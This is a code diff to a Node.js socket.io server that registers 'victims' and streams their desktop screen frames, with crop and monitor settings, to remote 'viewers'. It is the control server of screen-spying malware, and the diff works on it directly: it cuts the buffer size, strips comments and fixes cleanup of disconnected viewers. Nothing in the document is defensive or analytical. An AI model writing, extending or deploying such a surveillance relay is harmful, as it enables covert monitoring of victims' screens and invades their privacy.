@@ -8,20 +8,19 @@ const server = http.createServer(app);
 const io = new Server(server, {
   transports: ["websocket", "polling"],
   cors: { origin: "*" },
-  maxHttpBufferSize: 10 * 1024 * 1024,
+  maxHttpBufferSize: 1 * 1024 * 1024,  // down from 10MB
   pingTimeout: 60000,
   pingInterval: 25000
 });
 
 const PORT = process.env.PORT || 8080;
 
-// ── State ──
-const victims = new Map();        // victimId -> { socket, w, h, connectedAt, monitors }
-const viewers = new Map();        // socket -> { viewing: victimId }
-const frameStreams = new Map();   // victimId -> Set<viewerSockets>
+const victims = new Map();
+const viewers = new Map();
+const frameStreams = new Map();
 
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "client.html"));
+  res.sendFile(path.join(__dirname, "/client.html"));
 });
 
 app.get("/healthz", (req, res) => {
@@ -31,9 +30,7 @@ app.get("/healthz", (req, res) => {
 io.on("connection", (socket) => {
   console.log(`[+] Connection: ${socket.id}`);
 
-  // ══════════════════════════════════════
   // VICTIM
-  // ══════════════════════════════════════
   socket.on("register-victim", (data) => {
     const victimId = data.id || socket.id;
     victims.set(victimId, {
@@ -52,13 +49,16 @@ io.on("connection", (socket) => {
     socket.on("frame", (frameData) => {
       const stream = frameStreams.get(victimId);
       if (stream && stream.size > 0) {
+        // Only relay to connected viewers
+        const toRemove = [];
         stream.forEach((viewerSocket) => {
           if (viewerSocket.connected) {
             viewerSocket.emit("frame", { victimId, buf: frameData.buf });
           } else {
-            stream.delete(viewerSocket);
+            toRemove.push(viewerSocket);
           }
         });
+        toRemove.forEach(ws => stream.delete(ws));
       }
     });
 
@@ -84,9 +84,7 @@ io.on("connection", (socket) => {
     });
   });
 
-  // ══════════════════════════════════════
   // VIEWER
-  // ══════════════════════════════════════
   socket.on("register-viewer", () => {
     socket.role = "viewer";
     viewers.set(socket, { viewing: null });
@@ -95,7 +93,7 @@ io.on("connection", (socket) => {
 
     socket.on("select-victim", (data) => {
       const victimId = typeof data === "string" ? data : data.id;
-      const crop = data.crop || null;  // { x, y, w, h } or null for full desktop
+      const crop = data.crop || null;
       
       const victim = victims.get(victimId);
       if (!victim) {
@@ -125,15 +123,13 @@ io.on("connection", (socket) => {
       }
       frameStreams.get(victimId).add(socket);
 
-      // Tell victim about viewer count + crop settings
       victim.socket.emit("viewer-count", frameStreams.get(victimId).size);
       if (crop) {
         victim.socket.emit("set-crop", crop);
       } else {
-        victim.socket.emit("set-crop", null); // full desktop
+        victim.socket.emit("set-crop", null);
       }
 
-      // Send victim info with monitor list
       socket.emit("victim-info", {
         id: victimId,
         w: crop ? crop.w : victim.w,
